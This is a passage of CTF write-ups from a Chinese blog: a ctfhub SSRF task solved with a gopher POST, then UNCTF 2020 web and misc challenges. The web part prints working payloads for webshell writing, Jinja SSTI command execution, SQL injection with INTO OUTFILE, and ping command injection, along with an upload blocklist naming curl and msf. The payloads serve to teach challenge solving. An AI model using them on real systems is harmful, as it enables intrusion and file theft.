    <title>ctfhub-ssrf-post</title>
    <url>/2020/09/23/ctfhub-ssrf-post/</url>
    <content><![CDATA[<p><strong>转载自csdn的<a href="https://blog.csdn.net/rfrder/article/details/108589988" target="_blank" rel="noopener">bfengj</a>师傅</strong></p>
<p>根据题目：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.我准备了一个302.php,可能对你有用哦。</p>
<p>我们首先知道已经有了302.php，而且应该是需要我们利用SSRF发一个POST的请求。SSRF发送POST请求，自然而然就想到了gopher。同时题目中也提到了curl，而curl正好是支持gopher协议的，因此这题大概率就是利用gopher发送一个POST请求，然后获得flag。</p>
<p>我们进入之后可以试试flag.php，果然存在flag.php，不过需要从127.0.0.1进行访问。我们访问一下：<br><img src="/2020/09/23/ctfhub-ssrf-post/1.png" alt="1"></p>
<p>我们看到了key参数，大概率就是POST请求访问flag.php，同时带上key参数，但是得利用gopher。<br>我们再访问一下302.php，得到了源码：<br><img src="/2020/09/23/ctfhub-ssrf-post/2.png" alt="2"><br>说明302.php这里存在了一个302跳转。<br>我们首先构造一个POST请求。下面的是最基本的POST请求，也就是说如果构造POST，至少下面这些的内容一定要有。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=8a6d748f4f820709cd9e444991d49dd0</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>

<p>注意Content-Length那里，必须和你的POST请求长度一样，不然结果就出不了。<br>接下来我们要把这个POST请求进行一次URL编码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D8a6d748f4f820709cd9e444991d49dd0</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>这里又是一个问题，首先就是对换行的处理。如果你的POST请求编码出来的换行是%0A，就需要把%0A改成%0D%0A：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D8a6d748f4f820709cd9e444991d49dd0</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>然后还要再进行2次URL编码</strong>，也就是说一共要进行三次URL编码，我当时就是因为只进行了2次，就没弄到flag。<br>最终：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250AHost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D8a6d748f4f820709cd9e444991d49dd0</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>然后用burp进行请求就可以了：<br><img src="/2020/09/23/ctfhub-ssrf-post/3.png" alt="3"><br>成功获得flag。</p>
<p>ps:最后附上一个自己写的转换payload脚本，上面师傅的’/‘其实可以不用转换成url编码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">test = \</span><br><span class="line"><span class="string">"""POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=f87d7aca2ef8e1d9437bb06de880d8cd</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">new1 = urllib.parse.quote(new)</span><br><span class="line">new2 = urllib.parse.quote(new1)</span><br><span class="line">result = <span class="string">'gopher://127.0.0.1:80/_'</span>+new2</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>ctfhub</tag>
        <tag>技能树</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>UNCTF-2020-WP</title>
    <url>/2020/11/15/UNCTF-2020-WP/</url>
    <content><![CDATA[<p>又是一年一度的UNCTF，作为一个菜鸡大三老咸鱼，还是做不出师傅们出的这些萌新题，还被全栈的学弟吊着打，不由再次感叹我太菜了〒▽〒</p>
<p>因为赶着要交WP，就先写的简单点吧，好了不说废话了，直接上WP</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="0x1-easy-ssrf"><a href="#0x1-easy-ssrf" class="headerlink" title="0x1 easy_ssrf"></a>0x1 easy_ssrf</h3><p>简单的SSRF题目，用@或者分号啥的绕过preg_match,没过滤phar，直接用phar读取/flag即可</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web1-1.png" alt="web1-1"></p>
<h3 id="0x2-easyphp"><a href="#0x2-easyphp" class="headerlink" title="0x2 easyphp"></a>0x2 easyphp</h3><p>一开始连题目在哪都找不到，后来hint了/?source才知道emmm，看了下源码是获取任意个get的参数</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web2-1.png" alt="web2-1"></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web2-2.png" alt="web2-2"></p>
<p>php的代码审计题目，第一步就是要爆破sha1，只要爆破出sha1(0e+数字)=0e加数字的就可以了，直接在php里面爆比较方便，最后得到0e1290633704，至于这个adminPassword自己可以改就无所谓了</p>
<p>后面就是绕过长度限制，这里用的是覆盖GLOBELS变量的方法，直接将GLOBELS当作数组传进去，GLOBELS数组的key为要执行的命令即可绕过长度限制</p>
<p>payload如下</p>
<p><code>?source&amp;password=111&amp;source&amp;adminPassword=698d51a19d8a121ce581499d7b701668&amp;verif=0e1290633704&amp;GLOBALS[var1;exec(&quot;echo &#39;&lt;?php @eval($w);?&gt;&#39; &gt; 1.php&quot;);$a]=222&amp;w=$_POST[key]</code></p>
<p>这样之后原来的GLOBELS就被我们传入的GLOBELS给覆盖掉了，此时$key的值就是<code>var1;exec(&quot;echo &#39;&lt;?php @eval($w);?&gt;&#39; &gt; 1.php&quot;);$a</code>，而$GLOBELS[$key]的值为222，eval中拼接后的命令为<code>$var1;exec(&quot;echo &#39;&lt;?php @eval($w);?&gt;&#39; &gt; 1.php&quot;);$a=&quot;222&quot;;</code>，完美绕过了限制，写入了webshell，至于$w为什么要单独传入，因为直接往文件里写入$_GET和$_POST似乎会被过滤掉，不知道为啥，所以就这么写了。找了半天没发现flag，最后发现在phpinfo里，绝了。。。</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web2-3.png" alt="web2-3"></p>
<h3 id="0x3-babyeval"><a href="#0x3-babyeval" class="headerlink" title="0x3 babyeval"></a>0x3 babyeval</h3><p>也是一道php题目，过滤了括号，ctfshow上有类似的题，直接拿payload来用就好了</p>
<p>推荐参考这篇博客<a href="https://www.cnblogs.com/NPFS/p/13797436.html" target="_blank" rel="noopener">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web3-2.png" alt="web3-2"></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web3-1.png" alt="web3-1"></p>
<h3 id="0x4-l0vephp"><a href="#0x4-l0vephp" class="headerlink" title="0x4 l0vephp"></a>0x4 l0vephp</h3><p>f12看到flag.php和一串base85，解码是get action，根据hint用php://filter读源码发现base被过滤了，换成rot13，成功读到flag.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//hint:316E4433782E706870</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>hint转字符为1nD3x.php，进去发现又是一个php的rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里当时也没绕，因为一开始这题flag就在/flag，直接就读到了。。。</p>
<p>咋绕还没研究过，据说p神的博客上有，好像是这篇文章<a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p>
<p>有空研究下</p>
<h3 id="0x5-easyflask"><a href="#0x5-easyflask" class="headerlink" title="0x5 easyflask"></a>0x5 easyflask</h3><p>这个题目好像也有点问题，可以直接注册admin，最后看源码确实也不让注册，不知道为啥就可以，本来第一步应该要爆破jwt的key的好像。。</p>
<p>admin登录后给了一个路由<code>/secret_route_you_do_not_know</code>，访问后要我们传入guess猜数字</p>
<p>一开始尝试爆破发现数字确实是可以猜的，最后一步说啥读取source code不知道啥意思，但是每次数字都不一样，也就是说在一次的会话中才能继续下一步，也不知道正常是怎么个解法</p>
<p>后来发现可以ssti，但是过滤了一大堆东西，不过可以用attr额外传参，参考知乎这篇文章</p>
<p><a href="https://zhuanlan.zhihu.com/p/93100225" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/93100225</a></p>
<p>最后payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?guess&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(117)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)|attr(request.args.re)()&#125;&#125;</span><br><span class="line">&amp;x1&#x3D;__class__</span><br><span class="line">&amp;x2&#x3D;__base__</span><br><span class="line">&amp;x3&#x3D;__subclasses__</span><br><span class="line">&amp;x4&#x3D;__getitem__</span><br><span class="line">&amp;x5&#x3D;__init__</span><br><span class="line">&amp;x6&#x3D;__globals__</span><br><span class="line">&amp;x7&#x3D;__builtins__</span><br><span class="line">&amp;x8&#x3D;eval</span><br><span class="line">&amp;x9&#x3D;__import__(%22os%22).popen(&quot;cat flag.txt&quot;)</span><br><span class="line">&amp;re&#x3D;read</span><br></pre></td></tr></table></figure>
<p><img src="/2020/11/15/UNCTF-2020-WP/web5-1.png" alt="web5-1"></p>
<h3 id="0x6-ezphp"><a href="#0x6-ezphp" class="headerlink" title="0x6 ezphp"></a>0x6 ezphp</h3><p>源码如下，就是一个弱类型，字符串和0比为true</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$username  = <span class="string">"admin"</span>;</span><br><span class="line">$password  = <span class="string">"password"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])? $_POST[<span class="string">'data'</span>]: <span class="string">""</span> ;</span><br><span class="line">$data_unserialize = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> ($data_unserialize[<span class="string">'username'</span>]==$username&amp;&amp;$data_unserialize[<span class="string">'password'</span>]==$password)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"username or password error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后的payload</p>
<p><code>data=a:2:{s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;}</code></p>
<h3 id="0x7-easyupload"><a href="#0x7-easyupload" class="headerlink" title="0x7 easyupload"></a>0x7 easyupload</h3><p>文件上传，无论是文件名还是内容带ph的都被ban了，可以通过改.htaccess的方法绕，jpg解析成php就可以了，至于htaccess里的php可以用<code>\</code>加换行绕过，参考这篇文章</p>
<p><a href="https://www.anquanke.com/post/id/205098" target="_blank" rel="noopener">https://www.anquanke.com/post/id/205098</a></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web7-1.png" alt="web7-1"></p>
<p>shell的内容的话这些都被ban了，可以这么写<code>&lt;?=@eval($_POST[&#39;ant&#39;]);</code></p>
<p><code>perl|pyth|ph|auto|curl|base|\|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web7-2.png" alt="web7-2"></p>
<p>最后在根目录找到flag</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web7-3.png" alt="web7-3"></p>
<h3 id="0x8-ezfind"><a href="#0x8-ezfind" class="headerlink" title="0x8 ezfind"></a>0x8 ezfind</h3><p>这题很迷，脑洞题，有个搜索框但是跟后端没交互，最后get传参一个name=%00就出flag了，也不知道为啥，后来给了个hint<code>if(!(is_file($name)===false)){flag}else{no flag}</code>，看意思应该是is_file这个函数碰到%00变成null了，跟false比就变成false，然后!一下变成true，就出flag了</p>
<h3 id="0x9-checkin-sql"><a href="#0x9-checkin-sql" class="headerlink" title="0x9 checkin-sql"></a>0x9 checkin-sql</h3><p>一道注入题，select被ban，可以用堆叠注入加预处理语句绕过，堆叠注入的话任何被ban的字符都可以用char来代替，只要char没被ban，然后用concat连接就好了</p>
<p>最脑洞的是一开始在数据库里找了半天都没找到flag，最后说不在数据库里。。</p>
<p>所以考虑写入shell，至于路径的话盲猜了一个/var/www/html，最后又在phpinfo找到了flag</p>
<p>payload：<code>?inject=1&#39;;PREPARE jwt from concat(&#39;selec&#39;,&#39;t&#39;,&#39; &quot;&lt;?php phpinfo();&quot; into outfile &quot;/var/www/html/123&#39;,char(46),&#39;php&quot;&#39;);EXECUTE jwt;#</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web9-1.png" alt="web9-1"></p>
<h3 id="0x10-UN’s-online-tools"><a href="#0x10-UN’s-online-tools" class="headerlink" title="0x10 UN’s_online_tools"></a>0x10 UN’s_online_tools</h3><p>ping的命令注入rce，这道题也是趁着坏掉的时候做的，当时非法字符也直接打印出结果了。。</p>
<p>后来试了下可以用反斜杠，flag和*也被过滤了就用问号，空格用%09，payload如下</p>
<p><code>?url=127.0.0.1%0aca\t%09/fla?</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web10-1.png" alt="web10-1"></p>
<p>很奇怪的后来看了源码明明反斜杠也被ban了，不知道为啥能执行。。</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/web10-2.png" alt="web10-2"></p>
<p>正确的解法应该是用base64来绕过，payload如下</p>
<p><code>?url=127.0.0.1%0aecho%09Y2F0IC9mbGFn|base64%09-d|sh</code></p>
<h3 id="0x11-easyunserialize"><a href="#0x11-easyunserialize" class="headerlink" title="0x11 easyunserialize"></a>0x11 easyunserialize</h3><p>简单的反序列化字符逃逸，甚至就是上次ctfshow月饼杯的原题，把字符串改掉了而已emmm</p>
<p>直接上payload吧</p>
<p><code>challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;}aaa</code></p>
<p>这一串是104个字符，8个challenge替换后就多了32个字符，变成104个，成功将我们的password逃逸了出去，替换掉了原来的password</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="0x1-baba-is-you"><a href="#0x1-baba-is-you" class="headerlink" title="0x1 baba_is_you"></a>0x1 baba_is_you</h3><p>直接记事本打开末尾有一个B站地址，flag就在评论区</p>
<h3 id="0x2-被删除的flag"><a href="#0x2-被删除的flag" class="headerlink" title="0x2 被删除的flag"></a>0x2 被删除的flag</h3><p>这题目看意思好像要恢复文件，但是linux里strings一下就出来了</p>
<h3 id="0x3-阴阳人编码"><a href="#0x3-阴阳人编码" class="headerlink" title="0x3 阴阳人编码"></a>0x3 阴阳人编码</h3><p>这题一开始被骗了，因为GitHub上确实有一个阴阳怪气编码，但是怎么都解不出来</p>
<p>后来看到.?!想到了brainfuck/Ook编码，去<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">这里</a>把文字去掉保留.?!去解一下就出来了</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc3-1.png" alt="misc3-1"></p>
<h3 id="0x4-你能破解我的密码吗"><a href="#0x4-你能破解我的密码吗" class="headerlink" title="0x4 你能破解我的密码吗"></a>0x4 你能破解我的密码吗</h3><p>下载一个shadow文件，里面有这串hash<code>$1$AH$xtjky.3kppbU27tR0SDJT.</code>去cmd5上解下就行了，是123456</p>
<h3 id="0x5-爷的历险记"><a href="#0x5-爷的历险记" class="headerlink" title="0x5 爷的历险记"></a>0x5 爷的历险记</h3><p>一个RPG游戏，一开始玩了一会，发现打不过，就去文件里找了，最后在data文件夹的CommonEvents.json里找到了flag</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc5-1.png" alt="misc5-1"></p>
<h3 id="0x6-撕坏的二维码"><a href="#0x6-撕坏的二维码" class="headerlink" title="0x6 撕坏的二维码"></a>0x6 撕坏的二维码</h3><p>直接补两个定位点，一扫就出来了</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc6-1.png" alt="misc6-1"></p>
<h3 id="0x7-YLB绝密文件"><a href="#0x7-YLB绝密文件" class="headerlink" title="0x7 YLB绝密文件"></a>0x7 YLB绝密文件</h3><p>给了一个流量包，追踪tcp会发现一个压缩包，一个pyc文件和一段异或代码</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc7-1.png" alt="misc7-1"></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc7-2.png" alt="misc7-2"></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc7-3.png" alt="misc7-3"></p>
<p>手动把压缩包提取出来，解压得到一个异或过的文件，把pyc也手动提取出来，去<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">这里</a>反编译得到xor密钥<code>YLBSB?YLBNB!</code>，再用原代码异或一下得到base64，去<a href="http://base64.us" target="_blank" rel="noopener">base64.us</a>解码成hex，用winhex填入后得到一个docx文档，直接ctrf f搜索得到flag</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc7-4.png" alt="misc7-4"></p>
<h3 id="0x8-EZ-IMAGE"><a href="#0x8-EZ-IMAGE" class="headerlink" title="0x8 EZ_IMAGE"></a>0x8 EZ_IMAGE</h3><p>拼图题，直接用gaps拼就好了</p>
<p>gaps的环境不好搞，可以参考<a href="https://www.jianshu.com/p/d9e9019e8148" target="_blank" rel="noopener">这个</a></p>
<p>先用montage拼接</p>
<p><code>montage *.jpg -tile 15x15 -geometry +0+0 ../tmp.png</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc8-1.png" alt="misc8-1"></p>
<p>再用gap复原，size指的是每张图片的大小，这里为60*60</p>
<p><code>gaps --image=tmp.png --size=60 --save</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc8-2.jpg" alt="misc8-2"></p>
<h3 id="0x9-零"><a href="#0x9-零" class="headerlink" title="0x9 零"></a>0x9 零</h3><p>零宽隐写，linux下vim就可以看到零宽度字符，复制去去这个网站</p>
<p><a href="http://330k.github.io/misc_tools/unicode_steganography.html" target="_blank" rel="noopener">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>解码一下就好了</p>
<h3 id="0x10-YLB’s-CAPTCHA-签到题"><a href="#0x10-YLB’s-CAPTCHA-签到题" class="headerlink" title="0x10 YLB’s CAPTCHA - 签到题"></a>0x10 YLB’s CAPTCHA - 签到题</h3><p>确实签到题，就只要输入十次阴间验证码，下载下来放stegsolve里换个色道可以看清楚点</p>
<h3 id="0x11-躲猫猫"><a href="#0x11-躲猫猫" class="headerlink" title="0x11 躲猫猫"></a>0x11 躲猫猫</h3><p>下载下来一个打不开的xlsx，直接压缩包打开，在xl文件夹的sharedStrings.xml里发现base64 <code>dW5jdGYlN0I3MzgzYjY3ZGU5MTA2YTZmMTBmZGJlNGU4ZWJjNjRjZSU3RA==</code>，解码就是flag</p>
<h3 id="0x12-ET-msg"><a href="#0x12-ET-msg" class="headerlink" title="0x12 ET-msg"></a>0x12 ET-msg</h3><p>脑洞题，一开始都没人做出来，</p>
<p>首先给了一串长度为2400的01,看到一堆连在一起的0和1想到是画图，在python里尝试几次后发现是一张80*30的图，旋转之后再镜像翻转后如下，附上脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">80</span></span><br><span class="line">y = <span class="number">30</span></span><br><span class="line">s = <span class="stringspan></span><br><span class="line"><span class="comment"># s = s[::-1]</span></span><br><span class="line">im = Image.new(<span class="string">'RGB'</span>,(x,y))</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(x):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(y):</span><br><span class="line">        <span class="keyword">if</span> s[n]==<span class="string">'0'</span>:</span><br><span class="line">            im.putpixel([i,j],(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            im.putpixel([i,j],(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">im.save(<span class="string">"untmp.png"</span>)</span><br></pre></td></tr></table></figure>



<p><img src="/2020/11/15/UNCTF-2020-WP/misc12-1.png" alt="misc12-1"></p>
<p>然后就卡住了，我一开始被dcode上的Dotsies Font给误导了，以为是字符。。</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc12-2.jpg" alt="misc12-2"></p>
<p>后来出了hint：阿雷:Arecibo，百度一搜才知道是数字</p>
<p>后面的hint里还有个7，加上这张图最上面也是0到7，就想到了七进制</p>
<p>将图中先翻译成数字为133121214201066214100215205</p>
<p>三个一组分开，再转为10进制<br>73 64 109 99 48 109 49 110 103</p>
<p>查一下ascii得到flag：I@mc0m1ng</p>
<h3 id="0x13-mouse-click"><a href="#0x13-mouse-click" class="headerlink" title="0x13 mouse_click"></a>0x13 mouse_click</h3><p>常规鼠标流量题，先t-shark命令提取left-over区的数据</p>
<p><code>tshark -r mouse_click.pcapng -T fields -e usb.capdata &gt; usb1data.txt</code></p>
<p>再上脚本将数据转化为坐标</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usb1data.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line">res = open(<span class="string">'res.txt'</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = int(line[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">        y = int(line[<span class="number">4</span>:<span class="number">6</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">            x -= <span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">            y -= <span class="number">256</span></span><br><span class="line">        posx += x</span><br><span class="line">        posy += y</span><br><span class="line">        btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">        <span class="comment"># print(line[4:6])</span></span><br><span class="line">​        <span class="keyword">if</span> btn_flag == <span class="number">1</span> :</span><br><span class="line">​            print(posx,posy)</span><br><span class="line">​            res.write(str(posx)+<span class="string">' '</span>+str(-posy))</span><br><span class="line">​            res.write(<span class="string">'\n'</span>)</span><br><span class="line">​    <span class="keyword">except</span>:</span><br><span class="line">​        <span class="keyword">pass</span></span><br><span class="line">res.close()</span><br></pre></td></tr></table></figure>

<p>最后Gnuplot画图即可</p>
<p><code>plot &quot;res.txt&quot; using 1:2</code></p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc13-1.png" alt="misc13-1"></p>
<h3 id="0x14-网络深处1"><a href="#0x14-网络深处1" class="headerlink" title="0x14 网络深处1"></a>0x14 网络深处1</h3><p>创新题，师傅出题出了好久，可惜google有网站可以一把梭，舒服的拿了个一血emmm</p>
<p>首先有段wav音频，可以听出来是拨号声，提示了电话号码是压缩包密码，但当时我只有python的dtmf这个脚本，解不出来里面的数字，所以用archpr爆破了下，也挺快，后来根据舒服说的用dtmf2num这个软件本可以解出来，试了下确实可以，如下</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc14-1.png" alt="misc14-1"></p>
<p>打开压缩包后又是一段wav，直接拖到au，看频谱图发现关键词tupper</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc14-2.png" alt="misc14-2"></p>
<p>Google一下发现是可以画图的一个东西，具体是啥也没明白，最后把第一个txt里的数字放在这个网站画个图就拿到flag了</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc14-3.png" alt="misc14-3"></p>
<h3 id="0x15-倒影"><a href="#0x15-倒影" class="headerlink" title="0x15 倒影"></a>0x15 倒影</h3><p>简单题，winhex打开发现最后有一段base64，解码给了一个倒过来的hex，直接python里[::-1]倒一下，填入winhex得到压缩包，最后爆破一下密码就行了</p>
<h3 id="0x16-太极八卦"><a href="#0x16-太极八卦" class="headerlink" title="0x16 太极八卦"></a>0x16 太极八卦</h3><p>纯算法题，这题搞了好久，主要是双螺旋矩阵不会写。。</p>
<p>首先是根据那张图，一开始就想到了要从左上和右下来双螺旋读取数据，可惜代码能力太弱了，后来在<a href="https://blog.csdn.net/guang_mang/article/details/78625231" target="_blank" rel="noopener">csdn</a>上找到了一个脚本，自己改了下就拿来用了，至于双螺旋矩阵，就是下面这种</p>
<p><img src="/2020/11/15/UNCTF-2020-WP/misc16-1.png" alt="misc16-1"></p>
<p>生成了矩阵后，就是一个读取问题了，我的想法就是，先生成一个长度跟给的八卦数据一样的矩阵，也就是57*57，然后做一个字典，读取txt中的内容后将每组八卦图形都对应编号，然后再按顺序读取就行。读取完数据后还要做一个替换，将每个八卦图像替换成相应的二进制，再转成10进制，再去对应base64的码表转换成base64，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pairterSpiralMatrix1</span><span class="params">(size, f)</span>:</span>  <span class="comment"># f位1左上开始，0右下开始</span></span><br><span class="line">    <span class="keyword">if</span> (size % <span class="number">2</span> != <span class="number">1</span>):</span><br><span class="line">        size += <span class="number">1</span></span><br><span class="line">    arr = [([<span class="number">0</span>] * size) <span class="keyword">for</span> i <span class="keyword">in</span> range(size)]  <span class="comment"># 生成矩阵</span></span><br><span class="line">    max = (size * size + <span class="number">1</span>) // <span class="number">2</span>  <span class="comment"># 矩阵最大值</span></span><br><span class="line">    min = <span 